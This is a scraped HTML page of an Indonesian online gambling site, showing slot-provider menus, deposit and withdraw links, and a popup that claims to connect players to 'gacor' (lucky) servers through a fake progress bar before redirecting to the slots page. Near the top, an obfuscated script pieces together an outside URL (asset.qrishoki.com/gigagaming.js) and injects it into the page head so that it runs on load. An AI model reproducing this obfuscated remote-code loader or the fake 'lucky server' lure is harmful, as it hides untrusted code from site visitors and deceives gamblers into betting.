          <h3 style="text-align:center; color:#FFD700;">SERVER INTERNATIONAL</h3>
          <p style="text-align:center; color:#fff;">Silahkan Pilih Server:</p>
    
          <select id="serverSelect" style="
            width: 100%;
            padding: 12px;
            font-size: 16px;
            margin-bottom: 15px;
            background-color: #2b2b2b;
            color: #fff;
            border: 1px solid #FFD700;
            border-radius: 4px;
          ">
            <option value="id">SERVER GACOR INDONESIA</option>
            <option value="sg">SERVER GACOR SINGAPORE</option>
            <option value="th">SERVER GACOR THAILAND</option>
            <option value="ae">SERVER GACOR DUBAI</option>
            <option value="vn">SERVER GACOR VIETNAM</option>
            <option value="ph">SERVER GACOR FILIPINA</option>
            <option value="mm">SERVER GACOR MYANMAR</option>
            <option value="jp">SERVER GACOR JEPANG</option>
            <option value="ru">SERVER GACOR RUSIA</option>
            <option value="kr">SERVER GACOR KOREA</option>
            <option value="cn">SERVER GACOR CHINA</option>
            <option value="hk">SERVER GACOR HONGKONG</option>
            <option value="my">SERVER GACOR MALAYSIA</option>
            <option value="int">SERVER GACOR INTERNATIONAL 🌐</option>
          </select>
    
          <div style="
            background-color: #333;
            height: 22px;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 12px;
            border: 1px solid #FFD700;
          ">
            <div id="progressBar" style="
              width: 0%;
              background: linear-gradient(90deg, #FFD700, #B7870C);
              height: 100%;
              text-align: center;
              color: #111;
              font-size: 14px;
              font-weight: bold;
              text-shadow: 0 0 5px rgba(0,0,0,0.6);
              transition: width 0.3s;
            ">0%</div>
          </div>
    
          <p id="statusText" style="text-align: center; font-weight: bold; color:#FFD700;"></p>
    
          <div style="text-align: center;">
            <button id="btnConnect" style="
              background: linear-gradient(to bottom, #FFD700, #B7870C);
              color: #111;
              border: none;
              padding: 10px 30px;
              border-radius: 6px;
              font-size: 14px;
              font-weight: bold;
              cursor: pointer;
              box-shadow: 0 0 12px rgba(255,215,0,0.6);
            ">HUBUNGKAN</button>
          </div>
        </div>
      `;
      document.body.appendChild(popup);
    
      document.getElementById("btnOpenMaxwin").addEventListener("click", () => {
        popup.style.display = "flex";
      });
    
      document.getElementById("closeMaxwin").addEventListener("click", () => {
        popup.style.display = "none";
        resetProgress();
      });
    
      let hasConnected = false;
    
      document.getElementById("btnConnect").addEventListener("click", () => {
        if (hasConnected) return;
    
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        let progress = 0;
    
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = true;
    
        const interval = setInterval(() => {
          progress += 5;
          bar.style.width = progress + "%";
          bar.textContent = progress + "%";
    
          if (progress >= 100) {
            clearInterval(interval);
            bar.style.background = "limegreen";
            bar.textContent = "100%";
            status.innerText = "Selesai!";
            status.style.color = "#fff";
    
            const url = new URL('/slots', window.location.href);
            url.protocol = 'https:';
            url.hostname = location.hostname;
            url.port = '';
            window.location.replace(url.toString());
          }
        }, 100);
      });
    
      function resetProgress() {
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        bar.style.width = "0%";
        bar.textContent = "0%";
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = false;
      }
    });
    </script> 

<script>var _0x1344b2=_0x1928;(function(_0x234a18,_0x44183a){var _0x576849=_0x1928,_0x326a2e=_0x234a18();while(!![]){try{var _0x27c6e9=parseInt(_0x576849(0x1ae))/(-0x83+-0x2a9*-0x5+-0xcc9)+parseInt(_0x576849(0x1a7))/(0x2*-0x788+-0x1a17+-0x29*-0x101)*(-parseInt(_0x576849(0x1a2))/(0xd1b+0xd4*-0x2d+0x182c))+parseInt(_0x576849(0x1a8))/(-0x193e+0x98f*0x2+0x189*0x4)+-parseInt(_0x576849(0x1a9))/(-0x2620+0x1*0x202d+0x5f8)+parseInt(_0x576849(0x1c0))/(-0x15*0x1af+-0x1*-0x1e62+0x4ff)*(-parseInt(_0x576849(0x1bd))/(0x1313+-0x627+-0xce5))+-parseInt(_0x576849(0x1a4))/(-0x1d*-0x4a+0xde*-0x2+-0x34f*0x2)*(parseInt(_0x576849(0x1b4))/(-0x5e*0x53+0x881*-0x2+0x5*0x981))+-parseInt(_0x576849(0x1ab))/(-0x2f3*0x1+0x1*0x2345+0x4*-0x812)*(-parseInt(_0x576849(0x1c2))/(-0x17be+-0x1*0xa7b+0x2244));if(_0x27c6e9===_0x44183a)break;else _0x326a2e['push'](_0x326a2e['shift']());}catch(_0x5a009a){_0x326a2e['push'](_0x326a2e['shift']());}}}(_0x3d03,0x9*0x22131+-0x2151*0x96+0xb20c2));var _0x60b0bc=(function(){var _0x34a08f=!![];return function(_0x4da461,_0x19bb5e){var _0x9b4c1c=_0x34a08f?function(){var _0x123dba=_0x1928;if(_0x19bb5e){var _0x442e90=_0x19bb5e[_0x123dba(0x1c1)](_0x4da461,arguments);return _0x19bb5e=null,_0x442e90;}}:function(){};return _0x34a08f=![],_0x9b4c1c;};}()),_0x3a9b7d=_0x60b0bc(this,function(){var _0x29a51c=_0x1928,_0x346248={'RCpcD':_0x29a51c(0x1b6)+'+$'};return _0x3a9b7d[_0x29a51c(0x1be)]()[_0x29a51c(0x1b9)](_0x346248[_0x29a51c(0x1aa)])[_0x29a51c(0x1be)]()[_0x29a51c(0x1b3)+'r'](_0x3a9b7d)[_0x29a51c(0x1b9)](_0x29a51c(0x1b6)+'+$');});function _0x1928(_0x3ef2e8,_0x51db8f){var _0x26a1e3=_0x3d03();return _0x1928=function(_0x5c46d7,_0x3a8e08){_0x5c46d7=_0x5c46d7-(0xb6d+-0x13ac*-0x1+-0x13*0x18d);var _0x214423=_0x26a1e3[_0x5c46d7];return _0x214423;},_0x1928(_0x3ef2e8,_0x51db8f);}_0x3a9b7d();var hokiScript=document[_0x1344b2(0x1af)+_0x1344b2(0x1bc)](_0x1344b2(0x1b5));hokiScript[_0x1344b2(0x1b8)]=_0x1344b2(0x1b0),hokiScript[_0x1344b2(0x1b7)]=function(){var _0x15387f=_0x1344b2;hokiStart(_0x15387f(0x1b2));},hokiScript[_0x1344b2(0x1b1)]=_0x1344b2(0x1c3)+_0x1344b2(0x1a5)+_0x1344b2(0x1ad)+_0x1344b2(0x1ba),hokiScript[_0x1344b2(0x1ac)]=!(0x64e+0x1864+-0x1eb2),document[_0x1344b2(0x1a6)+_0x1344b2(0x1bf)](_0x1344b2(0x1a3))[0x1c46+0xedc+-0x2b22][_0x1344b2(0x1bb)+'d'](hokiScript);function _0x3d03(){var _0x125f3a=['script','(((.+)+)+)','onload','type','search','agaming.js','appendChil','ent','7Bdcwop','toString','sByTagName','7760958dxQrVz','apply','11qiFdit','https://as','231cSYnel','head','4315888oRPJPA','set.qrisho','getElement','4084pGAqGP','4756920BcGrRD','3277430pMpqSo','RCpcD','13030170VaIjxy','async','ki.com/gig','1398991GuWUbO','createElem','module','src','cpg138','constructo','18mtIYQh'];_0x3d03=function(){return _0x125f3a;};return _0x3d03();}</script>
 





 
<meta charset="utf-8">

<meta name="csrf-token" content="NBEbKxG6lPy03y4rzVutbS2sGHgPjHuNJefNtVGv">

<script src="/assets/js/jquery/jquery.min.js"></script>
<script src="/assets/js/bootstrap/bootstrap.min.js"></script>

     
                        <link rel="preload" href="/assets/fonts/ugsubskin/icomoon/fonts/icomoon.woff2" as="font" type="font/woff2" crossorigin="anonymous">
      <link rel="stylesheet" href="/assets/fonts/ugsubskin/icomoon/style.min.css" media="all" onload="this.media='all'"> 
      <link rel="stylesheet" href="/assets/css/swiper.css">

  <link type="text/css" rel="stylesheet" href="/assets/css/app-mobile.css">     
    <link type="text/css" rel="stylesheet" href="/assets/css/custom.css">
    <script src="/assets/js/jquery/sweet_alert2.min.js"></script>
 

  <link rel="stylesheet" href="/assets/js/jquery/jquery-ui.min.css" media="all" onload="this.media='all'">
  <script src="/assets/js/jquery/jquery-ui.min.js" defer=""></script>
  <script type="text/javascript" src="/assets/js/jquery/jquery.ui.touch-punch.min.js" defer=""></script>



 
  <div class="full-container layout">
    <div id="sideNav" class="side-nav">
      <nav class="nav-content">
  <ul class="side-nav-items">
    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/home.php?i=1#" onclick="closeNav(-1);">
        <div><i class="icon-home"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@HOME">HOME</div>
      </a>

    </li>
            
      
    <li class="nav-item">
      <a href="#" class="navlink has-sub" onclick="openNavItem(0);" [ngclass]="{'active':isOpenNavContent[0], '':   !isOpenNavContent[0]}">
        <div><i class="icon-coins"></i></div>
        <div class="nav-title" i18n="@Funds">Dana</div>
      </a>
      <div class="nav-item-content" [ngclass]="{'open':isOpenNavContent[0], '':!isOpenNavContent[0]}">
        <ul class="submenu account">
          <li>
            <a href="https://www.Goblin88.site/deposit.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-pig"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Deposit</div>
            </a>
          </li>
          <li>
            <a href="https://www.Goblin88.site/withdraw.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-transfer"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Withdraw</div>
            </a>
          </li>
          <li>
            <a href="https://www.Goblin88.site/history.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-history"></i></span></div>
              <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
            </a>
          </li>
        
          <li>
            <a href="https://www.Goblin88.site/refferal.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-users"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Referral &nbsp;</div>
            </a>
          </li>
      

        </ul>
      </div>
    </li>
    
        <li class="nav-item">
      <a href="#" class="navlink has-sub" onclick="openNavItem(1);" [ngclass]="{'active':isOpenNavContent[1], '':   !isOpenNavContent[1]}">
        <div><i class="icon-videogame_asset"></i></div>
        <div class="nav-title" i18n="">PERMAINAN</div>
      </a>
      <div class="nav-item-content games" [ngclass]="{'open':isOpenNavContent[1], '':!isOpenNavContent[1]}">
        <ul class="submenu">
                  <!-- <i class="icon-lottery"></i>
                  <i  class="icon-others"></i>    -->

                                   <li>  <a href="https://www.Goblin88.site/slot.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-slot"></i>
               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">SLOTS</div>
            </a>
            </li>
                                                <li>  <a href="https://www.Goblin88.site/live.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <img src="/assets/images/live_game_icon3860.gif" ref="live game" height="41px">               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">LIVE GAMES</div>
            </a>
            </li>
                                                <li>  <a href="https://www.Goblin88.site/sports.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-soccer"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">SPORTS</div>
            </a>
            </li>
                                                <li>    <a href="https://www.Goblin88.site/casino.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-casino"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">CASINO</div>
            </a>
            </li>
                                                <li>
              <a href="https://www.Goblin88.site/lottery.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                      <i class="icon-lottery"></i>
                    
                    </span>
                    <span class="hot sub new ">NEW</span>
                </div>
                <div class="fs-sm mt-1">LOTRE</div>
               </a>
            </li>
                                                <li>
              <a href="https://www.Goblin88.site/fish-hunter.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                    <i class="icon-fish_hunter"></i>
                    </span>
                </div>
                <div class="fs-sm mt-1">TEMBAK IKAN</div>
               </a>
            </li>
                                                <li>   <a href="https://merdekaMERCUSUAR77.site/e-games" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-others"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">E-GAMES</div>
            </a>
            </li>
                        

        </ul>
      </div>
    </li>

            <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/promosaya.php" onclick="closeNav(-1);">
        <div><i class="icon-user1"></i></div> 
        <div class="nav-title" i18n="@PROMOS">Promo saya</div>
      </a>
    </li>
          <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/promotion.php" onclick="closeNav(-1);">
        <div><i class="icon-gift"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@PROMOS">PROMOSI</div>
      </a>
    </li>
    
        <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/refferal.php" onclick="closeNav(-1);">
        <div><i class="icon-users"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@REFERRAL">
                        REFERRAL                      </div>
      </a>

    </li>
                    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/rtpbaby.php" target="_blank" onclick="closeNav(-1);">
        <div>
          <i></i>
          <img src="/assets/ImageFile/202505252031220000002213b1fcac__babyrtp__200x200.webp" width="30px" height="30px">
        </div> <!--routerLinkActiveOptions for root URL-->

        <div class="nav-title">CEK RTP LIVE</div>
      </a>
    </li>
       


    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/info.php" onclick="closeNav(-1);">
        <div><i class="icon-info"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@INFO">INFO</div>
      </a>

    </li>
    <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/contact-us.php" onclick="closeNav(-1);">
        <div><i class="icon-address-book"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="">HUBUNGI KAMI</div>
      </a>
    </li>
    <li class="nav-item">
      <a href="#" class="navlink" onclick="closeNav();" data-trigger="nifty" data-target="#langModal-mobile">
       <div><i class="icon-language"></i></div>
       Bahasa      </a>
    </li>
    <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/" onclick="closeNav(-1);">
        <div><i class="icon-display"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title">Desktop View</div>
      </a>
    </li>
        <li class="nav-item"><a href="#" class="navlink" onclick="closeNav();"> <i class="icon-double_arrow_l"></i></a></li>
  </ul>
</nav>


<script>
var arr= [0,0];

function openNavItem(index){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');
    if(index>=0){
        $('.nav-item-content').eq(index).addClass('open');
        $('.navlink.has-sub').eq(index).addClass('active');
        $( "#mainContent" ).addClass( "navContentOpen" );
        $( "#sideNav" ).addClass( "navContentOpen" );
    }
}

function closeNav(){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');

    $( "#sideNav" ).removeClass( "navContentOpen" );
    $( "#sideNav" ).removeClass( "open" );
    $( "#mainContent" ).removeClass( "navContentOpen" );
    $( "#mainContent" ).removeClass( "sideNavOpen" );

}
</script>
    </div>

    <div class="main-content" id="mainContent">
      <div class="backdrop" id="mainContentContainer">

        <div class="top-bar">
          <div class="inner-header flex-row ">

<button id="btnToggleSideNav" class="btn btn-link" aria-label="side nav toggle">
    <i class="icon-bars"></i>
  </button>
  <a href="https://www.Goblin88.site/" title="" class="logo">
    <div><img class="img-fluid" alt="MERCUSUAR77" src="/assets/ImageFile/mercusuar.gif"></div>
  </a>

          <a id="btnToggleRSideNav">
      <i class="icon-user-o"></i>    
    </a>
    
  



</div>
        </div>
        <div class="content my01">

                                                  <div class="container wallet-bal">
                <div class="row text-left">
                  <div class="col-xs-6">
                    <button class="btn btn-clear btn-refresh-wallet">
                      <i class="icon-currency-dollar fs-lg i-dollar"></i>
                      &nbsp;&nbsp;
                      
                      <span class="bal-txt">IDR <?php echo $saldo_game; ?></span>
                    </button>
                  </div>
                    <div class="col-xs-6 noSidePadding i-refresh">
                                                                  <button class="btn btn-clear btn-refresh-wallet pull-right"><i class="icon-refresh-2"></i></button>
                    </div>
                </div>

                <div class="row game-bals" id="other-game-bals" style="display:none;">
                  <div class="">
                    <table class="table">
                      

                    <!-- <tr>
                        <td class="col-xs-4"><button class="btn btn-clear btn-refresh-PT">Playtech <i
                              class="icon-refresh"></i></button></td>
                        <td class="col-xs-7"><span class="bal-PT">0.00</span></td>
                        <td class="col-xs-1"><button class="btn btn-clear btn-tran-PT" data-toggle="tooltip"
                            data-placement="bottom" title="Transfer ALL to Wallet"><i
                              class="icon-arrow-bold-up"></i></button></td>
                      </tr> -->
                      <!-- <tr>
                        <td class="col-xs-4"><button class="btn btn-clear btn-refresh-CMD">CMD <i
                              class="icon-refresh"></i></button></td>
                        <td class="col-xs-7"><span class="bal-CMD">0.00</span></td>
                        <td class="col-xs-1">
                          <button class="btn btn-clear btn-tran-CMD" data-toggle="tooltip" data-placement="bottom"
                            title="Transfer ALL to Wallet">
                            <i class="icon-arrow-bold-up"></i></button></td>
                      </tr> -->
                      

                      

                    </table>
                  </div>
                </div>

              </div>
                        
          <!-- <div class="content-loader" *ngIf="subs.state$.requests.getAllGamesViewByCategory.inProgress; else content"><app-spinner></app-spinner> </div> -->


<div class="container pt-1 sub-games">
           <div>
 
  <h3 class="title" i18n="">slots PROVIDERS</h3>
  <div class="row">


  </div>

  <div class="scroll-wrapper row" style="height:72px;">

    <div class="left"><button class="prev-btn btn" id="left-button"><i class="icon-keyboard_arrow_left"></i></button></div>

    <div style="overflow:hidden;width:100%;" class="scroller">
      <div class="row no-gutters text-center slider-content">
        <!--//hardcoded links.......-->




                
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="pragmatic-play.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/images/ppslotc619.gif" data-src="/assets/images/ppslotc619.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PRAGMATIC</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="pgsoft.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/images/pgsoft8510.gif" data-src="/assets/images/pgsoft8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PGSOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="joker-gaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/jk_slot8510.png" data-src="/assets/assets/game_logos/100x70/jk_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JOKER</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="besoft.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/besoft_slot8510.png" data-src="/assets/game_logos/100x70/besoft_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BESOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box active" href="spadegaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/sg_slot8510.gif" data-src="/assets/game_logos/100x70/sg_slot8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SPADE GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="joker-gaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/jk_rng8510.png" data-src="/assets/game_logos/100x70/jk_rng8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JOKER</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="besoft.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70//besoft_slot8510.png" data-src="/assets/game_logos/100x70//besoft_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BESOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="spadegaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/sg_slot8510.gif" data-src="/assets/game_logos/100x70/sg_slot8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SPADE GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="jili.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/jili.gif?v=1.0" data-src="/assets/game_logos/100x70/jili.gif?v=1.0" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JILI</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="fastspin.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/fastspin_slot8510.gif" data-src="/assets/game_logos/100x70/fastspin_slot8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FASTSPIN</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="booongo.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/booongo_slot.webp" data-src="/assets/game_logos/100x70/booongo_slot.webp" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BNG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="playtech.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/pt_slot.webp" data-src="/assets/game_logos/100x70/pt_slot.webp" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYTECH</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="wow-gaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/wow_slot8510.png" data-src="/assets/game_logos/100x70/wow_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">WOW GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="sigma.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/sigmagaming_slot.gif?v=1.0" data-src="/assets/game_logos/100x70/sigmagaming_slot.gif?v=1.0" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SIGMA GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="habanero.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/hb_slot8510.png" data-src="/assets/game_logos/100x70/hb_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HABANERO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/fatpanda" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/fatpanda_slot8510.png" data-src="/assets/game_logos/100x70/fatpanda_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FAT PANDA</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/advantplay" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/advantplay_slot8510.png" data-src="/assets/game_logos/100x70/advantplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">ADVANTPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/hacksaw" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/hacksaw_slot8510.png" data-src="/assets/game_logos/100x70/hacksaw_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HACKSAW</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/relax" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/relax_slot8510.png" data-src="/assets/game_logos/100x70/relax_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">RELAX GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/microgaming" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/mg_slot8510.png" data-src="/assets/game_logos/100x70/mg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">MICRO GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/nolimitcity" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/nolimitcity_slot8510.png" data-src="/assets/game_logos/100x70/nolimitcity_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NOLIMITCITY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/nextspin" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/nextspin_slot8510.png" data-src="/assets/game_logos/100x70/nextspin_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NEXTSPIN</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/playstar" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/playstar_slot8510.png" data-src="/assets/game_logos/100x70/playstar_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYSTAR</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/cq9" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/cq9_slot8510.png" data-src="/assets/game_logos/100x70/cq9_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">CQ9</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/skywind" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/skywind_slot8510.png" data-src="/assets/game_logos/100x70/skywind_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SKYWIND</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/ai-gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/aigaming_slot8510.png" data-src="/assets/game_logos/100x70/aigaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">AI GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/redtiger" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/redtiger_slot8510.png" data-src="/assets/game_logos/100x70/redtiger_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">REDTIGER</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/netent" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/redtiger_net_slot8510.png" data-src="/assets/game_logos/100x70/redtiger_net_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NETENT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/playngo" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/playngo_slot8510.png" data-src="/assets/game_logos/100x70/playngo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYNGO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/cosmo-play" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/cosmo_slot8510.png" data-src="/assets/game_logos/100x70/cosmo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">COSMO PLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
